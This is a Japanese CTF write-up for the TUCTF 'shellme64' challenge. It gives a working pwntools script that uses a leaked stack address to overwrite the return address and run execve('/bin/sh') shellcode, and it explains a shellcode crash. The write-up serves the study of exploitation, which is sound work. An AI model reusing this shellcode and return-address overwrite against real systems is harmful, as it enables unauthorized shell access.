# TUCTF shellme64 pwn

## 問題
* binary
```
$ file shellme64 
shellme64: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, BuildID[sha1]=83254c97da6347cf9cb96f7fe5fad3a28968a719, for GNU/Linux 3.2.0, not stripped
```
* 実行時にrspのアドレスが出力されている

## 解法

rspに入っているアドレスがわかっているのでリターンアドレスをスタックの先頭アドレスに書き換えてシェルコードを実行させる。

```python
from pwn import *

io = process("./shellme64")
# io = remote("chal.tuctf.com", 30507)

# execve("/bin/sh")
# 命令\x57(push rdi)を削除している
shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x48\x89\xe6\xb0\x3b\x0f\x05"

buf = io.read()
addr_rsp =  buf[-17:-3]
print 'rsp address: {}'.format(addr_rsp)
addr_rsp = int(addr_rsp, 16)

exp = ""
exp += shellcode
exp += "A" * 100
exp = exp[:40]
exp += p64(addr_rsp)

io.send(exp)
io.interactive()

```

## 困った点

[シェルコード](http://shell-storm.org/shellcode/files/shellcode-603.php)を実行させようとすると、`push rdi`の命令でSEGVで死んだ。
コンテスト中はとりあえずその命令を削除することでシェルを起動させることができたが、原因はつかめなかった。

### SEGVの原因

`push rdi`直前の命令ででスタック上のシェルコードの最後の数バイトが上書きされてしまっていた。


SEGV直前のスタックの状態は下のようなイメージ. この次の`push rax`が実行されると送り込んだシェルコードが
書き換えられてしまう。

|  stack |
|--------|
|push rax|<- rip
|push rdi|
|mov rsi, rsp|
|mov al, 0x3b|
|syscall|
|000000000| <- rsp
|"/bin/sh"|
